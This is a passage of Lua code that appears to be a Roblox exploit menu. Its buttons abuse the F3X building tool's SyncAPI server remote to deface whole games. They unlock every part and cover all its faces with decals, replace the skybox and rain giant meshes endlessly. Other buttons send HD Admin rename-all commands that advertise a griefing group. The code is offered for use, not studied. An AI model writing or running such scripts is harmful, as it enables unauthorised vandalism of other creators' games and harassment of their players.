	spam("8408806737")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.209, 0,0.298, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "k00pify"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("135617890222572")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("135617890222572")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.631, 0,0.301, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Name all 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Name all MUAHAHA Z00NDKIDD IS HERE")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.772, 0,0.301, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Name all 3"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Name all TEAM Z00NDKIDD JOIN TODAY")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.056, 0,0.336, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Eagles2212 skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 13
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("132039908136846")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.195, 0,0.335, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Eagles2212 Decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 13
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("132039908136846")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.337, 0,0.335, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Rain Bowser"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	-- Check for SyncAPI in the player's character
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	-- Check for SyncAPI in ReplicatedStorage
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	-- Ensure tool is valid before proceeding
	if not tool then
		warn("SyncAPI not found")
		return
	end

	-- Reference to the SyncAPI endpoint
	local remote = tool.SyncAPI.ServerEndpoint

	-- Helper function to invoke the server
	local function invoke(args)
		remote:InvokeServer(unpack(args))
	end

	-- Function to set collision of a part
	function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		invoke(args)
	end

	-- Function to set anchor of a part
	function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		invoke(args)
	end

	-- Function to create a part
	function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		invoke(args)
	end

	-- Function to destroy a part
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		invoke(args)
	end

	-- Function to move a part
	function MovePart(part, cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		invoke(args)
	end

	-- Function to resize a part
	function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		invoke(args)
	end

	-- Function to add a mesh to a part
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		invoke(args)
	end

	-- Function to set a mesh for a part
	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		invoke(args)
	end

	-- Function to set texture for a part
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		invoke(args)
	end

	-- Function to set the name of a part
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}
		invoke(args)
	end

	-- Function to resize the mesh of a part
	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		invoke(args)
	end

	-- Main loop to create parts based on the HumanoidRootPart's position
	local hrpcf = player.Character.HumanoidRootPart.CFrame
	while wait(0.5) do
		local x = hrpcf.x
		local z = hrpcf.z
		local randint = math.random(-600, 600)
		local randint2 = math.random(-600, 600)
		local xloc = randint + x
		local zloc = randint2 + z
		local cf = player.Character.HumanoidRootPart.CFrame.y + 400

		spawn(function()
			-- Create a part at the new location
			CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf+400), math.floor(zloc)))

			-- Check all parts in the workspace and modify them
			for _, v in ipairs(game.Workspace:GetDescendants()) do
				if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
					SetName(v, "b_1337")
					SetAnchor(false, v)
					AddMesh(v)
					Resize(v, Vector3.new(100, 100, 100), v.CFrame)
					MeshResize(v, Vector3.new(3, 3, 3))
					SetMesh(v, "90808863456704")
					SetTexture(v, "430331587")
					SetCollision(v, false)
				end
			end
		end)
	end

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.48, 0,0.335, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Rain annoying orange"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 10
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	-- Check for SyncAPI in the player's character
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	-- Check for SyncAPI in ReplicatedStorage
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	-- Ensure tool is valid before proceeding
	if not tool then
		warn("SyncAPI not found")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function invoke(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		invoke({
			"SyncCollision",
			{
				{ Part = part, CanCollide = boolean }
			}
		})
	end

	function SetAnchor(boolean, part)
		invoke({
			"SyncAnchor",
			{
				{ Part = part, Anchored = boolean }
			}
		})
	end

	function CreatePart(cf)
		invoke({
			"CreatePart", "Normal", cf, workspace
		})
	end

	function DestroyPart(part)
		invoke({
			"Remove",
			{ part }
		})
	end

	function MovePart(part, cf)
		invoke({
			"SyncMove",
			{
				{ Part = part, CFrame = cf }
			}
		})
	end

	function Resize(part, size, cf)
		invoke({
			"SyncResize",
			{
				{ Part = part, CFrame = cf, Size = size }
			}
		})
	end

	function AddMesh(part)
		invoke({
			"CreateMeshes",
			{
				{ Part = part }
			}
		})
	end

	function SetMesh(part, meshid)
		invoke({
			"SyncMesh",
			{
				{ Part = part, MeshId = "rbxassetid://"..meshid }
			}
		})
	end

	function SetTexture(part, texid)
		invoke({
			"SyncMesh",
			{
				{ Part = part, TextureId = "rbxassetid://"..texid }
			}
		})
	end

	function SetName(part, stringg)
		invoke({
			"SetName",
			{ part },
			stringg
		})
	end

	function MeshResize(part, size)
		invoke({
			"SyncMesh",
			{
				{ Part = part, Scale = size }
			}
		})
	end

	local hrpcf = char:WaitForChild("HumanoidRootPart").CFrame
	spawn(function()
		while true do
			wait(0.5)
			local x = hrpcf.x
			local z = hrpcf.z
			local xloc = math.random(-600, 600) + x
			local zloc = math.random(-600, 600) + z
			local yloc = char.HumanoidRootPart.Position.Y + 400

			CreatePart(CFrame.new(math.floor(xloc), math.random(yloc, yloc+400), math.floor(zloc)))

			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Parent == workspace and math.floor(v.Position.X) == math.floor(xloc) and math.floor(v.Position.Z) == math.floor(zloc) then
					SetName(v, "b_1337")
					SetAnchor(false, v)
					AddMesh(v)
					Resize(v, Vector3.new(500, 500, 500), v.CFrame)
					MeshResize(v, Vector3.new(3, 3, 3))
					SetMesh(v, "115837528938235")
					SetTexture(v, "104738896666289")
					SetCollision(v, false)
				end
			end
		end
	end)
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.631, 0,0.334, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Rain Ugly Mario"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.TextScaled = true
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		_({
			"SyncCollision",
			{
				{
					Part = part,
					CanCollide = boolean
				}
			}
		})
	end

	function SetAnchor(boolean, part)
		_({
			"SyncAnchor",
			{
				{
					Part = part,
					Anchored = boolean
				}
			}
		})
	end

	function CreatePart(cf)
		_({
			"CreatePart",
			"Normal",
			cf,
			workspace
		})
	end

	function Resize(part, size, cf)
		_({
			"SyncResize",
			{
				{
					Part = part,
